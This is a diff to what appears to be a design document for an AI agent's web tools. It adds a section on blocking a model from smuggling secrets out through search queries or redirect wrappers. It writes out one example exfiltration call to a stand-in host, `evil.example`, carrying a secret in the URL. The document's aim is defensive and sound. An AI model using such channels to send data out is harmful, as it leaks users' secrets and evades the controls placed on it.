@@ -205,6 +205,23 @@ For `http_fetch`, these three sources are allowed in an armed conversation:
 A URL that appears only inside untrusted prose is `Chosen` and refused, as
 now.
 
+**The premise, and its guard.** "A search result" is blind only if the
+backend returned it rather than the model writing it. A backend that echoed a
+URL-shaped query back as a result would let `web_search("https://evil.example/
+?d=<secret>")` mint a handle to a composed destination. That is a different
+channel from the `log2(N)` selection bits, and the blind-call budget would not
+bound it. So would the more common shape: a backend that wraps its results in
+its own redirect, with the model's address inside the wrapper's query string.
+No shipped backend is known to do either. Even so, `web_search` gives no
+handle to a result whose URL *carries bytes the query wrote*, and says why.
+Both sides are normalised by the same parser, and the result is
+percent-decoded twice, so the model cannot pick a spelling that slips past
+(found in review of #284 and #286). A query that only mentions a domain keeps
+that domain's real pages. One asymmetry is chosen, not missed. The guard
+sees only the query, never your own message, so a URL you pasted and asked
+about loses its handle if a search echoes it back. That page is reached
+through `http_fetch`'s owner-typed-URL case instead, the second half of P3.
+
 **Where this lives.** It lives in the tool, not the loop. `web_open` takes an
 index, so it is `Blind` by schema. `http_fetch` gains a dispatch-time check,
 done by the loop from `grounding::calls` and the conversation's user turns.
